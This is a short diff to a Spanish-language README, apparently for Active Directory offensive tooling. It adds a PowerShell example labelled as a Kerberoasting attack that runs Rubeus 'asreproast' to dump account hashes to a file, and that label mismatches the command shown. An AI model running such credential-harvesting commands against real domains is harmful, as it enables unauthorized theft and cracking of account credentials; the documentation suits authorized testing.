@@ -12,5 +12,6 @@ Requisitos:
 - Algunas funciones requieren credenciales, tickets o privilegios específicos.
 
 ```powershell 
-❯ 
+# Kerberoasting attack 
+❯ .\Rubeus.exe asreproast /outfile:hashes.txt 
 ```
